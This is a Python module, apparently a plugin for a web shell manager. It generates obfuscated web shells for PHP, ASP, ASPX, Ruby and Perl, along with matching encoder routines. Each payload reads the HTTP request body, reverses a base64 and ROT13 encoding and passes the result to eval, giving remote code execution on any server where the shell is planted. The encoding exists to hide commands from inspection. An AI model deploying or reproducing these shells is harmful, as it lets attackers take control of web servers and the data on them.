# obfuscators/ROT13.py

import textwrap
import codecs
import json
import base64

PARAM_SCHEM = {
    "encoding" : "utf-8"
}

dicObfuscator = {
    'PHP' : textwrap.dedent('''
        function Encrypt($data) {
            return str_rot13($data);
        }
        ''').strip(),
    
    'ASP' : textwrap.dedent('''
        Function Encrypt(data)
            Dim i, c, code, out
            out = ""
            For i = 1 To Len(data)
                c = Mid(data, i, 1)
                code = Asc(c)
                If (code >= 65 And code <= 90) Then
                    code = code + 13
                    If code > 90 Then code = code - 26
                ElseIf (code >= 97 And code <= 122) Then
                    code = code + 13
                    If code > 122 Then code = code - 26
                End If
                out = out & Chr(code)
            Next
            Encrypt = out
        End Function
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        function Encrypt(data : String) : String {
            var out : System.Text.StringBuilder = new System.Text.StringBuilder();
            for (var i : int = 0; i < data.Length; i++) {
                var c : int = data.CharCodeAt(i);
                if (c >= 65 && c <= 90) {
                    c = ((c - 65 + 13) % 26) + 65;
                } else if (c >= 97 && c <= 122) {
                    c = ((c - 97 + 13) % 26) + 97;
                }
                out.Append(String.FromCharCode(c));
            }
            return out.ToString();
        }
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        def Encrypt(data)
            rot13 = data.tr(
                "A-Za-z",
                "N-ZA-Mn-za-m"
            )

            Base64.strict_encode64(rot13)
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        sub Encrypt {
            use MIME::Base64;
            my ($data) = @_;
            my $rot13 = $data;
            $rot13 =~ tr/A-Za-z/N-ZA-Mn-za-m/;

            return encode_base64($rot13, '');
        }
        ''').strip()
}

dicPayload = {
    'PHP': textwrap.dedent('''
        <?php
        $rawInput = file_get_contents("php://input");
        $encryptedBytes = base64_decode($rawInput);
        $decrypted = str_rot13($encryptedBytes);
        eval($decrypted);
        ?>
        ''').strip(),

    'ASP': textwrap.dedent('''
        Function ROT13(data)
            Dim i, c, code, out
            out = ""
            For i = 1 To Len(data)
                c = Mid(data, i, 1)
                code = Asc(c)
                If (code >= 65 And code <= 90) Then
                    code = code + 13
                    If code > 90 Then code = code - 26
                ElseIf (code >= 97 And code <= 122) Then
                    code = code + 13
                    If code > 122 Then code = code - 26
                End If
                out = out & Chr(code)
            Next
            ROT13 = out
        End Function

        Dim raw, decoded
        raw = Request.BinaryRead(Request.TotalBytes)

        Dim stream
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write raw
        stream.Position = 0
        stream.Type = 2
        stream.Charset = "utf-8"
        decoded = stream.ReadText
        stream.Close
        Set stream = Nothing

        Function Base64Decode(ByVal str)
            Dim xml, node
            Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xml.createElement("b64")
            node.DataType = "bin.base64"
            node.Text = str
            Base64Decode = node.NodeTypedValue
            Set node = Nothing
            Set xml = Nothing
        End Function

        Dim encryptedBytes, b64Str
        encryptedBytes = Base64Decode(decoded)

        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write encryptedBytes
        stream.Position = 0
        stream.Type = 2
        stream.Charset = "utf-8"
        b64Str = stream.ReadText
        stream.Close
        Set stream = Nothing

        Dim plaintext
        plaintext = ROT13(b64Str)
        eval plaintext
        ''').strip(),

    'ASPX': textwrap.dedent('''
        <%@ Page Language="JScript" Debug="true" %>
        <%@ Import Namespace="System.IO" %>
        <%@ Import Namespace="System.Text" %>

        <script runat="server">
        function ROT13(data : String) : String {
            var out : System.Text.StringBuilder = new System.Text.StringBuilder();
            for (var i : int = 0; i < data.Length; i++) {
                var c : int = data.CharCodeAt(i);
                if (c >= 65 && c <= 90) {
                    c = ((c - 65 + 13) % 26) + 65;
                } else if (c >= 97 && c <= 122) {
                    c = ((c - 97 + 13) % 26) + 97;
                }
                out.Append(String.FromCharCode(c));
            }
            return out.ToString();
        }

        function Page_Load(sender, e) {
            try {
                var inputStream = Request.InputStream;
                var len = inputStream.Length;
                var rawData = new byte[len];
                inputStream.Read(rawData, 0, len);
                
                var b64String = Encoding.UTF8.GetString(rawData);
                var encryptedData = Convert.FromBase64String(b64String);
                var rot13Str = Encoding.UTF8.GetString(encryptedData);
                
                var plaintext = ROT13(rot13Str);
                eval(plaintext);
            } catch(err) {
                // Handle error
            }
        }
        </script>
        ''').strip(),
    
    'Ruby' : textwrap.dedent(
        '''
        require 'base64'

        begin
            len = ENV['CONTENT_LENGTH'].to_i
            raw_input = STDIN.read(len)
            raw_input = raw_input.gsub(' ', '+')

            unless raw_input.empty?
                encrypted_bytes = Base64.decode64(raw_input)
                decrypted = encrypted_bytes.dup

                # str_rot13()
                decrypted = decrypted.tr(
                    "A-Za-z",
                    "N-ZA-Mn-za-m"
                )

                eval(decrypted)

            end
        rescue => e
            print "Content-Type: text/plain\\r\\n\\r\\n"
            print e.message
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        use strict;
        use warnings;
        use MIME::Base64;

        my $len = $ENV{CONTENT_LENGTH} || 0;
        read(STDIN, my $rawInput, $len);
        $rawInput =~ s/\s+//g;
        my $encryptedBytes = decode_base64($rawInput);
        my $decrypted = $encryptedBytes;
        $decrypted =~ tr/A-Za-z/N-ZA-Mn-za-m/;

        eval $decrypted;
    ''').strip(),

}

def obfuscator(payload, script, key=None, **kwargs):
    if script in dicObfuscator.keys():
        return dicObfuscator[script]
    else:
        return ''

def build(payload, script, **kwargs):
    if script in dicPayload.keys():
        return dicPayload[script]
    else:
        return ''

def example(payload, **kwargs):
    return json.dumps(PARAM_SCHEM, indent=4)

def available(payload, **kwargs):
    scripts = []
    for script in dicPayload.keys():
        if not script in dicObfuscator.keys():
            continue

        scripts.append(script)

    return ','.join(scripts)

def obfuscate(payload, encoding='utf-8', **kwargs):
    if isinstance(payload, bytes):
        payload = payload.decode(encoding)

    rot13 = codecs.encode(payload, 'rot_13')

    return base64.b64encode(rot13.encode(encoding)).decode()


def deobfuscate(payload, encoding='utf-8', **kwargs):
    if isinstance(payload, bytes):
        payload = payload.decode(encoding)

    decoded = base64.b64decode(payload)

    return codecs.decode(decoded.decode(encoding), 'rot_13')